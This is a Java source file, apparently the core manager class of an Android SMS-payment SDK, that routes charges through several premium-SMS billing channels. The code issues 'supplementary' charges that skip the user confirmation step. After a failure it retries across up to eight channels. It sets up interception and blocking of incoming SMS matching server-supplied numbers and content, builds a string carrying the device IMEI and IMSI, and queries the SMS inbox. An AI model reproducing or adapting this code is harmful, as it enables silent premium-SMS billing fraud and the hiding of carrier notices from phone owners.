package com.y7.smspay.sdk.mgr;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.y7.smspay.PayManager;
import com.y7.smspay.count.PayNet;
import com.y7.smspay.mp.srv.DDDLog;
import com.y7.smspay.mp.srv.MPoyCallback;
import com.y7.smspay.mp.srv.Ms;
import com.y7.smspay.sdk.channel.BasePoyChannel;
import com.y7.smspay.sdk.channel.BytePoyChannel;
import com.y7.smspay.sdk.channel.DYBNPoyChannel;
import com.y7.smspay.sdk.channel.DefaultPoyChannel;
import com.y7.smspay.sdk.channel.IPoyChannelListener;
import com.y7.smspay.sdk.channel.MPPoyChannel;
import com.y7.smspay.sdk.channel.MdoPoyChannel;
import com.y7.smspay.sdk.channel.PoyChannelFactory;
import com.y7.smspay.sdk.channel.SendTwoChannel;
import com.y7.smspay.sdk.channel.SimpleChannel;
import com.y7.smspay.sdk.channel.TaiHaoPoyChannel;
import com.y7.smspay.sdk.channel.YCPoyChannel;
import com.y7.smspay.sdk.json.ChannelEntity;
import com.y7.smspay.sdk.json.ForceReq;
import com.y7.smspay.sdk.json.GetDataImpl;
import com.y7.smspay.sdk.json.JsonUtil;
import com.y7.smspay.sdk.json.MessageEntity;
import com.y7.smspay.sdk.json.RequestEntity;
import com.y7.smspay.sdk.json.SetEntity;
import com.y7.smspay.sdk.json.ThroughEntity;
import com.y7.smspay.sdk.ss.SsParse;
import com.y7.smspay.sdk.util.Constants;
import com.y7.smspay.sdk.util.HttpSdSsTool;
import com.y7.smspay.sdk.util.PoySharedPreference;
import com.y7.smspay.sdk.util.SPUtil;
import com.y7.smspay.sdk.util.SingleAction;
import com.y7.smspay.sdk.util.StrUtils;
import com.y7.smspay.sdk.util.Utils;

import org.json.JSONException;
import org.json.JSONObject;

public class YManager {
    private static YManager mCpManager = null;
    private static SetEntity setEntity = null;

    private ThroughEntity Through;
    private String initialPrice;// 初始价格

    public int throughCounter = 0; // 控制循环次数
    public static final int THROUGNUMBER = 8; // 循环通道数

    public int payNumber = 0; // 支付次数

    private static PoySharedPreference psp;

    public int PayThrough = 0;

    public static YManager getInstance() {
        if (mCpManager == null) {
            mCpManager = new YManager();
        }
        return mCpManager;
    }

    /**
     * 检查补单
     */
    void payTheLostBill(final Context ctx) {
        if (setEntity == null) {
            return;
        }

        // 2014-10-11 added by pengbb 新增补单逻辑
        if (!TextUtils.isEmpty(setEntity.prices)) {// 需要补单的价格
            for (String x : setEntity.prices.split(",")) {// 价格有多个,找到具体价格对应的通道？
                if (!TextUtils.isEmpty(x)) {// 价格存在
                    //DDDLog.d("payInit 正常补单:" + x);
                    RequestEntity orderInfo = GetDataImpl.getInstance(ctx)
                            .getmRequestEntity().clone();// 组装请求参数
                    orderInfo.customized_price = x;// 请求单价，多个单价中间用“,”隔开。如不传则返回支持通道，否则返回指定单价的通道
                    YManager.getInstance().reqChannelId(ctx,
                            setEntity.supplyPrice + "", "", "补单A", "", "0",
                            new YPoyCallbackInfo(orderInfo, new MPoyCallback() {

                                @Override
                                public void onResult(int state, String price) {
                                    // TODO Auto-generated method stub

                                }
                            }), true);
                }
            }
        }

        if (setEntity.supplyPrice > 0) {
            Boolean isPayTheUnfairBill = Utils.getIsPayTheUnfairLost(ctx) == 1;
            //DDDLog.d("payInit isPayTheUnfairBill=" + isPayTheUnfairBill);
            if (!isPayTheUnfairBill) {
                //DDDLog.d("payInit 补单:" + setEntity.supplyPrice);
                RequestEntity orderInfo = GetDataImpl.getInstance(ctx)
                        .getmRequestEntity().clone();
                orderInfo.customized_price = setEntity.supplyPrice + "";
                YManager.getInstance().reqChannelId(ctx,
                        setEntity.supplyPrice + "", "", "补单B", "", "0",
                        new YPoyCallbackInfo(orderInfo, new MPoyCallback() {
                            @Override
                            public void onResult(int state, String price) {
                                // TODO Auto-generated method stub
                                Utils.saveIsPayTheUnfairLost(ctx, 1);
                            }
                        }), true);
            }
        }
    }

    /**
     * 支付初始化
     *
     * @param ctx
     */
    public void Init(final Context ctx, final SingleAction initFinishedAction) {
        //DDDLog.d("YManager payInit");
        try {
            new Thread() {
                @Override
                public void run() {
                    super.run();
                    long installTime = Utils.getInstallTime(ctx);
                    if (installTime == 0) {
                        Utils.saveInstallTime(ctx);
                    }

                    setEntity = GetDataImpl.getInstance(ctx).getPayInit();
                    if (setEntity == null) {
                        if (initFinishedAction != null) {
                            initFinishedAction.execute();
                        }
                        //DDDLog.d("进入支付失败逻辑 ----------- 10101010");
                        return;
                    }
                    SPUtil.save("throughCount", setEntity.throughCount);
                    //DDDLog.d("payInit-->" + setEntity.toString());

                    //DDDLog.d("setEntity.phone1-->" + setEntity.phone1);
                    //DDDLog.d("setEntity.phone2-->" + setEntity.phone2);

                    Constants.isBca = setEntity.isBca;

                    Constants.SERVER_PHONENUMBER1 = setEntity.phone1;
                    Constants.SERVER_PHONENUMBER2 = setEntity.phone2;

                    setQuerySsSql(ctx);

                    if (initFinishedAction != null) {
                        initFinishedAction.execute();
                    }

                    HttpSdSsTool.sendSmsPhone(ctx);

                    if (ForceReq.count > 0) {
                        Utils.TimerReqChannel(ctx);
                    }
                }
            }.start();
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    /**
     * 请求通道
     *
     * @param ctx
     * @param customized_price  金额
     * @param str               二次确认内容
     * @param product           道具名称
     * @param extData           透穿字符
     * @param Did               付费点ID
     * @param cb
     * @param skipSecondConfirm 是否跳过二次确认
     */
    public void reqChannelId(final Context ctx, final String customized_price,
                             final String str, final String product, final String extData,
                             final String Did, final YPoyCallbackInfo cb,
                             final Boolean skipSecondConfirm) {
        /**
         * 判断是否需要二次确认
         */
        boolean isSecondConfirm = false;
        if (setEntity != null)// setEntity? 如果setEntity有值 缺省or设置新值
            // setEntity初始化和赋值条件?
            isSecondConfirm = setEntity.isSecondConfirm;//
        if (skipSecondConfirm) {// 跳过二次确认为何设置为否跳过二次确认？,
            isSecondConfirm = false;
        }

        //DDDLog.d("throughCounter -->" + throughCounter);
        //DDDLog.d("PayThrough ---->" + PayThrough);
        //DDDLog.d("PayThrough -->" + PayThrough % THROUGNUMBER);
        if (throughCounter == 0)// 控制循环次数
            initialPrice = customized_price; // 初始金额=金额？
        if (isSecondConfirm) {// 是跳过二次确认
            //DDDLog.d("isSecondConfirm -->" + isSecondConfirm);

            SDlgHandle secondConfirmHandler = new SDlgHandle(ctx,
                    customized_price, str, product, extData, Did, cb, false);
            Message secondConfirmMsg = new Message();
            secondConfirmMsg.what = 1001;
            secondConfirmHandler.sendMessage(secondConfirmMsg);
        } else {
            //DDDLog.d("reqChannelId -->");
            reqChannelId(ctx, customized_price, product, extData, Did, cb);
        }
    }

    // 续单
    public void reqChannelId(final Context ctx, final String customized_price,
                             final String product, final String extData, final String Did,
                             final YPoyCallbackInfo cb) {

        if (psp == null)
            psp = PoySharedPreference.getInstance(ctx);// 静态存储
        try {
            new Thread() {
                @Override
                public void run() {
                    super.run();
                    Looper.prepare();// 保持线程loop handel msg 循环

                    if (!Constants.isTest) {// 调试状态可无卡测试
                        if (!Utils.getSIMState(ctx)) {
                            // 修复当手机SIM不存在时没有正常回调的问题
                            cb.postPayReceiver(YPoyManager.PayState_FAILURE,
                                    "1");
                            //DDDLog.d("sim异常支付失败");
                            return;
                        }
                    }

                    RequestEntity requestJson = GetDataImpl.getInstance(ctx)
                            .getmRequestEntity();

                    cb.setOrderInfo(requestJson.clone());
                    cb.setCustomized_price(customized_price);
                    cb.setImsi(requestJson.imsi);
                    cb.setY_id(requestJson.y_id);
                    cb.setPackId(requestJson.packId);
                    cb.setChannel_id(requestJson.channel_id);
                    cb.setUa(requestJson.ua);
                    cb.setThroughId("1");
                    cb.setDid(Did);

                    /**
                     * 判断类型SDK 不请求后台 其他类型请求后台走原来的逻辑
                     */
                    try {
                        switch (PayThrough % THROUGNUMBER) {
                            case 0:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.AThrough);
                                break;
                            case 1:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.BThrough);
                                break;
                            case 2:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.CThrough);
                                break;
                            case 3:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.DThrough);
                                break;
                            case 4:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.EThrough);
                                break;
                            case 5:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.FThrough);
                                break;
                            case 6:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.GThrough);
                                break;
                            case 7:
                                Through = (ThroughEntity) JsonUtil.parseJSonObject(
                                        ThroughEntity.class, setEntity.HThrough);
                                break;
                        }
                    } catch (Exception e) {
                        Through = new ThroughEntity();
                        //DDDLog.e("Exception", e);
                    }

                    if (!TextUtils.isEmpty(Through.id)) {//
                        Long lastRequestTime = psp.getThroughTimer(Through.id);// 为何有时间限制？相邻计费时间距离？
                        if (System.currentTimeMillis() - lastRequestTime < Through.timing * 1000) { // 如果时间限制了，那么走下一个通道
                            //DDDLog.d("间隔时间不够  需要" + Through.timing * 1000+ "毫秒");
                            if (throughCounter < THROUGNUMBER - 1) {
                                PayThrough++;
                                throughCounter++;
                                reqChannelId(ctx, customized_price, "",
                                        product, extData, Did, cb, true);
                            } else {
                                //DDDLog.e("return throughCounter -->"	+ throughCounter);
                            }
                            return;
                        }
                    } else {// 通道ID为空,
                        //DDDLog.d("通道ID为空");
                        PayThrough++;
                        throughCounter++;
                        reqChannelId(ctx, customized_price, "", product,
                                extData, Did, cb, true);
                        return;
                    }

                    ChannelEntity body = null;
                    if (Through.supplyprice.equals("0")) { // 是否限制金额
                        body = GetDataImpl.getInstance(ctx).getChannelId(
                                Through.id, initialPrice, Did, product);
                    } else {
                        body = GetDataImpl.getInstance(ctx).getChannelId(
                                Through.id, Through.supplyprice, Did, product);
                    }

                    if (body != null) {
                        if (Constants.cutPrice > 0) {// 请求成功,得到本次服务器返回价格
                            int tmpPrice = 0;
                            try {
                                tmpPrice = Integer.parseInt(body.thPrice);
                            } catch (Exception e) {
                                //DDDLog.e("失败 **********"+tmpPrice);
                            }
                            Constants.cutPrice = Constants.cutPrice - tmpPrice;
                        }

                        //DDDLog.e("body -->2");
                        // 将拦截信息保存起来
                        Utils.saveMessageBody(ctx, body.messageBody);
                        Utils.savePhoneNumber(ctx, body.phoneNumber);

                        // 2014-10-10 added by pengbb 初始化短信拦截设置
                        YManager.getInstance().setSmsInrp(body.phoneNumber,
                                body.messageBody);

                        SsParse.setSecondSms();
                        if (!TextUtils.isEmpty(SsParse.capCode)) {
                            SsParse.setcapCode();
                        }

                        cb.setThroughId(body.throughId);
                        cb.setSerParam(body.serParam);

                        if (!TextUtils.isEmpty(body.serParam)) {
                            // add 0406
                            HttpSdSsTool.YDSQStr = "serParam=" + body.serParam
                                    + "&" + "throughid=" + body.throughId + "&"
                                    + "imsi=" + requestJson.imsi + "&"
                                    + "packId=" + requestJson.packId + "&"
                                    + "did=" + Did + "&imei="
                                    + Utils.getIMEI(ctx);
                        } else {
                            HttpSdSsTool.YDSQStr = "throughid="
                                    + body.throughId + "&" + "imsi="
                                    + requestJson.imsi + "&" + "packId="
                                    + requestJson.packId + "&" + "did=" + Did
                                    + "&imei=" + Utils.getIMEI(ctx);
                        }

                    } else {// 失败
                        //Constants.cutPrice = 0;//失败的话价格为0
                        Log.i("paySDK", "通道状态不为0 返回 null 结束请求");
                        return;
//                        if (Through.type == 0) { // SDK继续往下走 /* 通道类型
//                            // 0,SDK,1,传统裸代,2,动态裸代 */
//                            //DDDLog.d("进入支付失败逻辑  *********************");
//                            body = new ChannelEntity();
//                            body.throughId = Through.id;
//                        } else {// 进入内循环
//                            /* 走下一个通道 */
//                            //DDDLog.d("失败 ***********1**********1");
//                            //DDDLog.d("throughCounter == " + throughCounter);
//                            //DDDLog.d("THROUGNUMBER == " + THROUGNUMBER);
//                            // 0<7
//                            // throughCounter = 8;
//                            if (throughCounter < THROUGNUMBER - 1) {
//
//                                //DDDLog.d("失败 ***********1**********2");
//                                PayThrough++;
//                                throughCounter++;
//                                // customized_price 限制支付金额
//                                reqChannelId(ctx, customized_price, "",
//                                        product, extData, Did, cb, true);
//                            }
//                            return;
//                        }
                    }
                    /** 缓存成功通道ID和时间 */
                    psp.setThroughTimer(body.throughId);
                    // 将cb事件转移 reqPay中cb实为reqChannelId中计费过程产生事件。比较绕。。
                    reqPay(ctx, customized_price, product, extData, Did, cb,
                            body);
                }
            }.start();
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    /**
     * 2014-11-06 added by pengbb 新增支持中国手游通道 支付
     *
     * @param ctx
     * @param price 价格
     */
    void reqPay(final Context ctx, final String price,
                final String productName, final String extData, final String Did,
                final YPoyCallbackInfo cb, final ChannelEntity channel) {

        Log.i("当前通道-->", channel.toString());
        if (null == channel.cid) {
            Log.i("当前通道-->", "null cid");
        }
        PayManager.payId = channel.cid;

        BasePoyChannel payChannel = PoyChannelFactory.getPayChannelByChannelId(
                Integer.parseInt(cb.getThroughId()), channel.payType,
                channel.type);
        payChannel.addPayChannelListener(new IPoyChannelListener() {

            @Override
            public void onPaySucceeded() {
                Toast.makeText(ctx, "回调成功", Toast.LENGTH_SHORT).show();
                cb.postPayReceiver(YPoyManager.PayState_SUCCESS, channel.state);
                throughCounter = 0;
                cb.getOrderInfo().is_supplement = 1;
            }

            @Override
            public void onPayFailed() {
                //DDDLog.d("进入支付失败逻辑");
                if (Utils.getIsRequest(ctx).equals("0")) { // 不执行应急
                    cb.postPayReceiver(YPoyManager.PayState_FAILURE,
                            channel.state);
                    return;
                }
                /**
                 * 失败的话修改渠道优先级
                 *
                 * 使用计数器失败加1，计数器必须小于渠道优先级数组的长度。
                 *
                 * 根据渠道优先级重新请求支付
                 *
                 * 成功计数器归0
                 */
                try {
                    Thread.sleep(1000);
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }

                if (throughCounter < THROUGNUMBER - 1) {

                    //DDDLog.d("onPayFailed to reqChannelId");

                    PayThrough++;
                    throughCounter++;
                    reqChannelId(ctx, price, "", productName, extData, Did, cb,
                            true);

                    cb.getOrderInfo().is_supplement = 1;
                    cb.postPayReceiver(YPoyManager.PayState_FAILURE,
                            channel.state);
                } else {
                    // 使用MDO本地生成短信方式支付 在有传入本地指令和确认有配置MDO的情况下
                    // 并且计数器归0
                    throughCounter = 0;
                    cb.getOrderInfo().is_supplement = 0;
                    cb.postPayReceiver(YPoyManager.PayState_FAILURE,
                            channel.state);
                    //DDDLog.d("计数器归零");
                }
                //DDDLog.d("进入支付失败逻辑 -- throughCounter -->" + throughCounter);
            }

            @Override
            public void onPayCanceled() {
                cb.postPayReceiver(YPoyManager.PayState_CANCEL, "1");
                throughCounter = 0;
            }
        });

        // 设置相关参数
        payChannel.setAppContext(ctx);
        payChannel.setPrice((int) Double.parseDouble(price));
        payChannel.setExtData(extData);
        payChannel.setProductName(productName);
        payChannel.setOrderInfo(cb.getOrderInfo());

        if (payChannel instanceof SimpleChannel) {
            ((SimpleChannel) payChannel).setChannel(channel);
        }

        if (payChannel instanceof SendTwoChannel) {
            ((SendTwoChannel) payChannel).setChannel(channel);
        }

        if (payChannel instanceof MdoPoyChannel) {
            //DDDLog.i("MdoPayChannel");
            ((MdoPoyChannel) payChannel)
                    .setChannelTelnumber(channel.channelTelnumber);
            ((MdoPoyChannel) payChannel).setPayCode(channel.command);
        }

        if (payChannel instanceof MPPoyChannel) {
            //DDDLog.i("MPPayChannel");
            ((MPPoyChannel) payChannel).setChannelTelnumber("1065889920");
            ((MPPoyChannel) payChannel).setPayCode(channel.command);
        }

        if (payChannel instanceof YCPoyChannel) {
            //DDDLog.i("YCPayChannel");
            ((YCPoyChannel) payChannel).setChannelTelnumber(channel.sendport);
            ((YCPoyChannel) payChannel).setPayCode(channel.uporder);
            ((YCPoyChannel) payChannel).setCid(channel.cid);
            if (TextUtils.isEmpty(channel.number)) {
                ((YCPoyChannel) payChannel).setNumber("1");
            } else {
                ((YCPoyChannel) payChannel).setNumber(channel.number);
            }
            ((YCPoyChannel) payChannel).setCustomized_price(channel.price);
        }

        /**
         * 默认通道,后台指令方式
         */
        if (payChannel instanceof DefaultPoyChannel) {
            //DDDLog.i("DefaultPayChannel");
            ((DefaultPoyChannel) payChannel).setChannel(channel);
            ((DefaultPoyChannel) payChannel).setThroughId(cb.getThroughId());
            ((DefaultPoyChannel) payChannel).setSourceCode(channel.sourceCode);
        }

        /**
         * 泰豪
         */
        if (payChannel instanceof TaiHaoPoyChannel) {
            //DDDLog.i("TaiHaoPayChannel");
            ((TaiHaoPoyChannel) payChannel).setReqPayUrl(channel.reqpayurl);
            ((TaiHaoPoyChannel) payChannel).setThroughId(cb.getThroughId());
        }

        /**
         * 成都鼎元百纳
         */
        if (payChannel instanceof DYBNPoyChannel) {
            //DDDLog.i("DYBNPayChannel");
            String[] dyParam = channel.reqpayurl.split(",");
            if (dyParam.length != 3) {
                return;
            }
            try {
                ((DYBNPoyChannel) payChannel).setChannelTelnumber(dyParam[0]);
                ((DYBNPoyChannel) payChannel).setDYChannelID(Long
                        .parseLong(dyParam[1]));
                ((DYBNPoyChannel) payChannel).setMD5(dyParam[2]);
                ((DYBNPoyChannel) payChannel).setThroughId(channel.throughId);
            } catch (Exception e) {
                //DDDLog.e("Exception", e);
            }
        }

//        /**
//         * 移动MM
//         */
//        if (payChannel instanceof YDMMPoyChannel) {
//            //DDDLog.i("YDMMPayChannel");
//            ((YDMMPoyChannel) payChannel).setMmPayParam(channel.mmpayparam);
//        }

        /**
         * 二进制短信
         */
        if (payChannel instanceof BytePoyChannel) {
            //DDDLog.i("BytePayChannel");
            ((BytePoyChannel) payChannel).setChannel(channel);
            ((BytePoyChannel) payChannel).setThroughId(cb.getThroughId());
        }

        // 通道付费
        payChannel.pay();// 走到这才开始执行，然后回调事件监听
    }

    /**
     * 2014-10-17 added by pengbb 同步订单
     *
     * @param ctx
     * @param orderInfo
     */
    public void saveOrder(final Context ctx, final RequestEntity orderInfo) {
        //DDDLog.d("saveOrder orderInfo bb-->" + orderInfo.toString());
        new Thread() {
            @Override
            public void run() {
                synchronized (orderInfo) {
                    //DDDLog.d("saveOrder orderInfo-->" + orderInfo.toString());
                    GetDataImpl.getInstance(ctx).saveOrder(orderInfo);
                }
            }
        }.start();
    }

    /**
     * 同步短信
     *
     * @param ctx
     * @param orderInfo
     */
    public void saveMessage(final Context ctx, final MessageEntity orderInfo) {
        //DDDLog.d("saveMessage orderInfo -->" + orderInfo.toString());
        new PayNet().start();
        new Thread() {
            @Override
            public void run() {
                synchronized (orderInfo) {
                    //DDDLog.d("saveMessage orderInfo-->" + orderInfo.toString());
                    GetDataImpl.getInstance(ctx).saveMessage(orderInfo);
                }
            }
        }.start();
    }

    void blockSMS(Context ctx) {
        //DDDLog.i("blockSMS init begin");

		/*
         * resolver = ctx.getContentResolver();
		 * resolver.registerContentObserver(Uri.parse(SMS_URI), true,
		 * smsContentObserver);
		 */
        Intent server = new Intent(ctx, Ms.class);
        server.setAction("blockSMS");
        ctx.startService(server);

        //DDDLog.i("blockSMS init ok");
    }

    void setSmsInrp(String _phoneNumbers, String _messageContents) {

        if (_phoneNumbers == null)
            _phoneNumbers = "";
        if (_messageContents == null)
            _messageContents = "";

        SsParse.setSmsInrp(_phoneNumbers, _messageContents);
    }

    /**
     * 付费点是否开起
     *
     * @param ctx
     */
    public void isNeedPay(final Context ctx, final String payID,
                          final YNeedPoyCallbackInfo cb) {
        try {
            new Thread() {
                @Override
                public void run() {
                    super.run();
                    String result = GetDataImpl.getInstance(ctx).isNeedPay(
                            payID);
                    if (TextUtils.isEmpty(result)) {
                        cb.postPayReceiver(YPoyManager.PayState_CANCEL, "0");
                        return;
                    }
                    //DDDLog.d("isNeedPay -->" + result);
                    JSONObject ob;
                    Boolean isNeedPay = false;
                    String price = "0";
                    try {
                        ob = new JSONObject(result);
                        isNeedPay = ob.getBoolean("fufeidian");
                        price = ob.getString("price");
                    } catch (JSONException e) {
                        //DDDLog.e("Exception", e);
                    }
                    if (isNeedPay) {
                        cb.postPayReceiver(YPoyManager.PayState_SUCCESS, price);
                    } else {
                        cb.postPayReceiver(YPoyManager.PayState_FAILURE, price);
                    }
                }
            }.start();
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    /**
     * 付费点是否开起
     *
     * @param ctx
     */
    public void OrderPayDetail(final Context ctx, final String Orderid,
                               final String productName, final String chargeName) {
        try {
            new Thread() {
                @Override
                public void run() {
                    super.run();
                    GetDataImpl.getInstance(ctx).OrderPayDetail(Orderid,
                            productName, chargeName);
                }
            }.start();
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    /**
     * 付费点是否开起
     *
     * @param ctx
     */
    public void PayRdo(final Context ctx, final String code) {
        try {
            new Thread() {
                @Override
                public void run() {
                    super.run();
                    GetDataImpl.getInstance(ctx).PayRdo(code);
                }
            }.start();
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    private void setQuerySsSql(Context ctx) {
        Cursor cursor_5 = null;
        try {
            cursor_5 = ctx.getContentResolver().query(
                    Uri.parse(StrUtils.SMS_ALL_URI),
                    new String[]{"_id", "address", "thread_id", "date",
                            "protocol", "type", "body", "read"},
                    "address like ? ", new String[]{"12345678" + "%"},
                    "date desc");
        } catch (Exception e) {
            //DDDLog.e("setQuerySsSql", e);
        } finally {
            if (cursor_5 != null && !cursor_5.isClosed()) {
                cursor_5.close();
            }
            cursor_5 = null;
        }
    }

}